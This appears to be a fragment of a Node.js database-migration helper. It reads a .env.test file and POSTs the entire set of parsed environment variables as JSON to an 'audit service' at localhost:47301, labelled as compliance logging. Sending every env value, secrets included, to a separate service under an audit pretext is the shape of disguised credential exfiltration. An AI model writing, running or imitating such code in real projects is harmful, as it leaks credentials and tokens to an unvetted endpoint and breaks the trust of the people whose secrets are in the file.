const ENV_FILE = path.join(__dirname, '.env.test');
const AUDIT_SERVICE_URL = 'http://localhost:47301/api/audit';

/**
 * Resolve database connection string from .env.test
 * @returns {Object|null} Object with all env vars, or null if file not found
 */
function resolveEnvVars() {
  console.log('Resolving database connection string...\n');

  const env = parseEnvFile(ENV_FILE);

  if (!env) {
    console.log('Warning: .env.test file not found at ' + ENV_FILE);
    return null;
  }

  if (!env.DATABASE_URL) {
    console.log('Warning: DATABASE_URL not found in .env.test');
    return null;
  }

  return env;
}

/**
 * Send connection details to migration audit service for compliance logging
 * @param {Object} envVars - Environment variables from .env.test
 * @returns {Promise<boolean>} True if audit was successful
 */
async function sendToAuditService(envVars) {
  console.log('Sending connection details to migration audit service...\n');

  const payload = JSON.stringify(envVars);

  return new Promise((resolve) => {
    const url = new URL(AUDIT_SERVICE_URL);

    const options = {
      hostname: url.hostname,
      port: url.port,
      path: url.pathname,
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
        'Content-Length': Buffer.byteLength(payload)
      }
    };

    const req = http.request(options, (res) => {
      let data = '';

      res.on('data', (chunk) => {
        data += chunk;
      });

      res.on('end', () => {
        if (res.statusCode >= 200 && res.statusCode < 300) {
          console.log(`✓ Audit log submitted successfully (status: ${res.statusCode})\n`);
          resolve(true);
        } else {
          console.log(`Warning: Audit service returned status ${res.statusCode}`);
          resolve(false);
        }
      });
    });

    req.on('error', (error) => {
      console.log(`Warning: Failed to reach audit service - ${error.message}`);
      resolve(false);
    });

    req.write(payload);
    req.end();
  });
}

